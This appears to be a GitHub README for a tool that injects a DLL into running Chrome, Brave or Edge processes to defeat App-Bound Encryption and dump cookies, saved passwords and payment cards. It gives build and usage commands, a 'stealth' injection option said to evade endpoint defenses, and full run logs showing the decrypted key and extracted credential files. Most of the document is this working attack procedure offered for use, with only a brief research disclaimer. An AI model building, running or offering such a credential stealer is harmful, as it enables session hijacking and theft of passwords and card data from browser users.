# Chrome App-Bound Encryption Decryption

## 🔍 Overview

Fully decrypt **App-Bound Encrypted (ABE)** cookies, passwords & payment methods from Chromium-based browsers (Chrome, Brave, Edge) — all in user mode, no admin rights required.

If you find this useful, I’d appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🛡️ Background

Starting in **Chrome 127+**, Google added App-Bound Encryption to strengthen local data:

1. **Key generation**: a per-profile AES-256-GCM key is created and wrapped by Windows DPAPI.
2. **Storage**: that wrapped key (Base64-encoded, prefixed with `APPB`) lands in your **Local State** file.
3. **Unwrapping**: Chrome calls the **IElevator** COM server, but **only** if the caller’s EXE lives in the browser’s install directory.

These path-validation checks prevent any external tool — even with direct DPAPI access — from unwrapping the ABE key.

## 🚀 How It Works

**This project** injects a tiny DLL into the running browser process (via `CreateRemoteThread` or `NtCreateThreadEx`), which then:

- **Runs from inside** the browser’s address space (satisfies IElevator’s install-folder check)
- **Invokes** the IElevator COM interface directly to unwrap the ABE key
- **Uses** that key to decrypt cookies, passwords and payment data — all in user land, no elevation needed

### ⚙️ Key Features

- 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods
- 🚧 Stealth DLL injection to bypass path checks & common endpoint defenses
- 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
- 🛠️ No admin privileges required

![image](https://github.com/user-attachments/assets/ec899d96-6a95-42b8-8af1-650adb52a9aa)


## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 136.0.7103.93                |
| **Brave**          | 1.78.97 (136.0.7103.93)      |
| **Microsoft Edge** | 136.0.3240.64                |

> [!NOTE]  
> The injector requires the target browser to be **running** unless you use `--start-browser`.

## 🔧 Build Instructions

1. **Clone** the repository and open a _Developer Command Prompt for VS_ (or any MSVC‑enabled shell).

2. **Prepare SQLite Amalgamation**

   1. Download the [SQLite “autoconf” amalgamation](https://www.sqlite.org/download.html) and place `sqlite3.c` and `sqlite3.h` into your project root.

   2. In a **Developer Command Prompt for VS** run:

   ```bash
   cl /nologo /W3 /O2 /MT /c sqlite3.c
   lib /nologo /OUT:sqlite3.lib sqlite3.obj
   ```

   This produces a `sqlite3.lib` you can link into the DLL.

3. **Compile the DLL** (responsible for the decryption logic):

   ```bash
   cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
   ```

4. **Compile the injector** (responsible for DLL injection & console UX):

   ```bash
   cl /EHsc /O2 /std:c++17 /MT chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
   ```

Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.

## 🚀 Usage

```bash
PS> .\chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--method load|nt`
  Injection method:

  - load = CreateRemoteThread + LoadLibrary (default)
  - nt = NtCreateThreadEx stealth injection

- `--start-browser`
  Auto-launch the browser if it’s not already running.

- `--verbose`
  Enable extensive debugging output.

### Examples

```bash
# Standard load-library injection:
PS> .\chrome_inject.exe chrome

# Use stealth NtCreateThreadEx method:
PS> .\chrome_inject.exe --method nt chrome

# Auto-start Brave and show debug logs:
PS> .\chrome_inject.exe --method load --start-browser --verbose brave
```

#### Normal Run

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Multi-Method Process Injector               |
|  Cookies / Passwords / Payment Methods       |
|  v0.7.0 by @xaitax                           |
------------------------------------------------

[*] Chrome not running, launching...
[+] Chrome (v. 136.0.7103.93) launched w/ PID 12360
[+] DLL injected via NtCreateThreadEx stealth
[*] Waiting for DLL decryption tasks to complete (max 60s)...
[+] DLL signaled completion.

[+] COM library initialized (APARTMENTTHREADED).
[+] IElevator instance created for Chrome.
[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Finished Base64 decoding with API (1224 bytes).
[+] Encrypted key header is valid.
[+] Encrypted key blob from Local State (1220 bytes).
[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
[+] IElevator -> DecryptData successful. Decrypted key length: 32
[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
[*] Chrome data decryption process finished for Chrome.
[*] Unloading DLL and exiting worker thread.
[*] Chrome terminated by injector.
```

#### Verbose

```bash
PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt --verbose
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Multi-Method Process Injector               |
|  Cookies / Passwords / Payment Methods       |
|  v0.7.0 by @xaitax                           |
------------------------------------------------

[#] Verbose mode enabled.
[#] CleanupPreviousRun: attempting to remove temp files
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[#] HandleGuard: acquired handle 184
[#] Created completion event: Global\ChromeDecryptWorkDoneEvent
[#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] GetProcessIdByName: snapshotting processes for chrome.exe
[#] HandleGuard: acquired handle 188
[#] GetProcessIdByName: Process chrome.exe not found.
[#] HandleGuard: closing handle 188
[*] Chrome not running, launching...
[#] StartBrowserAndWait: attempting to launch: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] HandleGuard: acquired handle 220
[#] HandleGuard: acquired handle 224
[#] Browser main thread handle: 224
[#] Browser process handle: 220
[#] Waiting 3s for browser to initialize...
[#] Browser started PID=15376
[#] HandleGuard: closing handle 224
[#] HandleGuard: closing handle 220
[#] Retrieving version info for: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] Version query successful: 136.0.7103.93
[+] Chrome (v. 136.0.7103.93) launched w/ PID 15376
[#] Opening process PID=15376
[#] HandleGuard: acquired handle 220
[#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
[#] Architecture match: Injector=ARM64, Target=ARM64
[#] GetDllPath: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] DLL path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] InjectWithNtCreateThreadEx: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] ntdll.dll base=140728837603328
[#] NtCreateThreadEx addr=140728837610688
[#] VirtualAllocEx size=87
[#] WriteProcessMemory complete for DLL path to remote address: 2344395866112
[#] Calling NtCreateThreadEx with LoadLibraryA at 140728775290080
[#] HandleGuard: acquired handle 224
[#] NtCreateThreadEx returned status 0, thread handle=224
[#] Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max 15s)...
[#] Remote LoadLibraryA thread (NtCreateThreadEx) finished.
[#] InjectWithNtCreateThreadEx: done
[#] HandleGuard: closing handle 224
[+] DLL injected via NtCreateThreadEx stealth
[*] Waiting for DLL decryption tasks to complete (max 60s)...
[+] DLL signaled completion.
[#] Attempting to display log file: C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log

[+] COM library initialized (APARTMENTTHREADED).
[+] IElevator instance created for Chrome.
[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Finished Base64 decoding with API (1224 bytes).
[+] Encrypted key header is valid.
[+] Encrypted key blob from Local State (1220 bytes).
[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
[+] IElevator -> DecryptData successful. Decrypted key length: 32
[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] 229 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
[*] Chrome data decryption process finished for Chrome.
[*] Unloading DLL and exiting worker thread.
[#] Terminating browser PID=15376 because injector started it.
[#] HandleGuard: acquired handle 236
[*] Chrome terminated by injector.
[#] HandleGuard: closing handle 236
[#] Injector finished.
[#] HandleGuard: closing handle 220
[#] HandleGuard: closing handle 184
```

## 📂 Data Extraction

Once decryption completes, three JSON files are emitted into your Temp folder:

- 🍪 **Cookies:** `%TEMP%\<Browser>_decrypt_cookies.txt`
- 🔑 **Passwords:** `%TEMP%\<Browser>_decrypt_passwords.txt`
- 💳 **Payment Methods:** `%TEMP%\<Browser>_decrypt_payments.txt`

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "origin": "https://example.com/login",
    "username": "user@example.com",
    "password": "••••••••••"
  },
  {
    "origin": "https://another.example.com",
    "username": "another_user",
    "password": "••••••••••"
  }
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name_on_card": "John Doe",
    "expiration_month": 12,
    "expiration_year": 2030,
    "card_number": "••••••••••1234",
    "cvc": "•••"
  },
  {
    "name_on_card": "Jane Smith",
    "expiration_month": 07,
    "expiration_year": 2028,
    "card_number": "••••••••••5678",
    "cvc": "•••"
  }
  …
]
```

## ⚠️ Potential Issues & Errors

### DecryptData failed. LastError: 2148073483

If you see: `DecryptData failed. LastError: 2148073483`

then in hex that’s `0x8009000B`, which corresponds to **NTE_BAD_KEY_STATE** (“Key not valid for use in specified state”). Under the hood this means **DPAPI** (the Windows Data Protection API) couldn’t decrypt the wrapped AES-GCM key stored in Chrome’s Local State.

#### Common causes  
- **Password change**  
  When you change your Windows logon password, Windows re-wraps your DPAPI master key under the new password—but if the old key can’t be decrypted (e.g. missing backup), any older data blobs fail.  
- **Wrong user or machine**  
  DPAPI keys are tied to a specific user + machine combo. Pointing at a profile copied from another account or PC will fail.  
- **Elevation/context mismatch**  
  If you run the injector as **Administrator** (or SYSTEM) against a non-elevated user’s profile, DPAPI will refuse because the decryption context doesn’t match the interactive user.  
- **Corrupted or missing DPAPI vault**  
  If the folder `%APPDATA%\Microsoft\Protect\{SID}` is missing or its permissions broken, DPAPI can’t find your master key.

#### Work-around / Notes  
- **Run as the same interactive user** (and at the same privilege level) that originally encrypted the Local State.  
- **Log off & back on** after password changes so Windows can re-encrypt your DPAPI vault.  
- **Ensure your profile folder hasn’t been moved or restored** from backup without the DPAPI vault.  
- There _is_ a recovery path via `IElevator::RunRecoveryCRXElevated(...)`, which can re-wrap keys even if DPAPI fails—but it isn’t included here to avoid giving malware an automated bypass.  

## 🆕 Changelog

### v0.7

- **New**: Implemented Kernel Named Events for flawless timing between Injector and DLL operations.
- **Improved**: Major refactoring of both Injector and DLL for enhanced stability, performance, and maintainability.
- **Improved**: Strict RAII implemented for all system resources (Handles, COM, SQLite) to prevent leaks.
- **Improved**: More accurate and immediate error code capture and reporting.
- **Improved**: Adaptive Locking Bypass / Enhanced Locked File Access (SQLite nolock=1 for Login Data/Payment Methods)
- **Improved**: Dynamic Path Resolution / Dynamic Path Discovery (modern Windows APIs)
- **Improved**: Optimized DLL's browser termination logic.

### v0.6

- **New**: Full Username & Password extraction
- **New**: Full Payment Information (e.g., Credit Card) extraction

### v0.5

- **New**: Full Cookie extraction into JSON format

### v0.4

- **New**: selectable injection methods (`--method load|nt`)
- **New**: auto‑start the browser if not running (`--start-browser`)
- **New**: verbose debug output (`--verbose`)
- **New**: automatically terminate the browser after decryption
- **Improved**: Injector code refactoring

Further Links:

- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
- [snovvcrash](https://x.com/snovvcrash)
- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

> [!WARNING]  
> This tool is intended for cybersecurity research and educational purposes. Ensure compliance with all relevant legal and ethical guidelines when using this tool.
